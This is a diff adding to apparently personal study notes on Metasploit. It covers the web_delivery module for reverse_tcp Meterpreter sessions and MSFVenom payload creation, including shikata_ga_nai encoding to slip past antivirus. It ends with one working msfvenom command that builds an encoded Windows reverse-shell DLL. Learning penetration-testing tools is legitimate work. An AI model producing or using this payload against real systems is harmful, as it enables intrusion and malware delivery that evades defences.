@@ -50,4 +50,16 @@ download the module to the folder
 msfdb reinit to restart the database 
 start msfconsole 
 search for the new exploit
-	
+
+
+### Exploits 
+#### web_delivery module 
+One line python command which can be use to create a reverse_tcp meterpreter connection by opening a url in python and downloading the exploit from the hacker site. 
+
+
+### MSFVenom 
+is a combination of msfpayload and masfencode putting these tools into a single framework instance is allows the user to create a payload which can be used on the target machine, MSFVenom allows the payload to be target to different platforms and formats. another tools msfvenom also comes with is encoded or scrambling of the payload to ensure that the anti virus does not detect the malware. 
+shikata_ga_nai is a common encoding type used for scrambling the malware. 
+2
+usage : 
+msfvenom -p windows/meterpreter/reverse_tcp lhost=<your ip>  lport=4444 -e x86/shikata_ga_nai -i 10 -f dll > payload.dll
